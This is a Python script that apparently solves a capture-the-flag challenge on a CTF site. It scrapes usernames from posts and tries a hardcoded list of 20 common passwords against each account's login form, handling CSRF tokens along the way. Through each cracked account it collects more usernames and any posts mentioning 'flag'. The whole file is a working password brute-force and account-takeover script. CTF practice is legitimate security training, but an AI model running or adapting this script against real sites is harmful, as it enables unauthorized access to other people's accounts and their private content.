import requests
import json
from bs4 import BeautifulSoup

passwords = ["qwerty", "123456", "qwertyuiop", "qwe123", "qweqwe", "1qaz2wsx", "1q2w3e4r", "qazwsx", "1q2w3e",
             "123qwe", "1q2w3e4r5t", "123456789", "111111", "zxcvbnm", "1234qwer", "qwer1234", "asdfgh",
             "marina", "q1w2e3r4t5", "qwerty123"]

if __name__ == '__main__':
    URL = 'https://placetospeak.ctf.yummytacos.me/'
    client = requests.session()
    client.get(URL)  # sets cookie
    csrf = client.cookies['csrftoken']
    posts = []
    users = {}
    r = client.get(URL)
    soup = BeautifulSoup(r.text)
    new_users = [x.text.split()[0] for x in soup.find_all(attrs={'class': 'blockquote-footer'})]
    for user in new_users:
        users[user] = None

    while True:
        new_users = []
        counter = 0
        for user in users:
            print(users)
            password = users[user]
            if password is None:
                counter += 1
                client.get(URL)
                csrf = client.cookies['csrftoken']
                for p in passwords:
                    login_data = dict(username=user, password=p, csrfmiddlewaretoken=csrf)
                    r = client.post(URL+'login', data=login_data, headers=dict(Referer=URL))
                    if r.json()['result'] == 'ok':
                        users[user] = p
                        break
                if users[user] is None:
                    users[user] = False
                else:
                    r = client.get(URL)
                    soup = BeautifulSoup(r.text)
                    new_users += [x.text.split()[0] for x in soup.find_all(attrs={'class': 'blockquote-footer'})]
                    posts += [x.text for x in soup.select('blockquote p') if 'flag' in x.text]
                    client.get(URL+'logout')
        for u in new_users:
            if u not in users:
                users[u] = None
        if counter == 0:
            break
    print(posts)
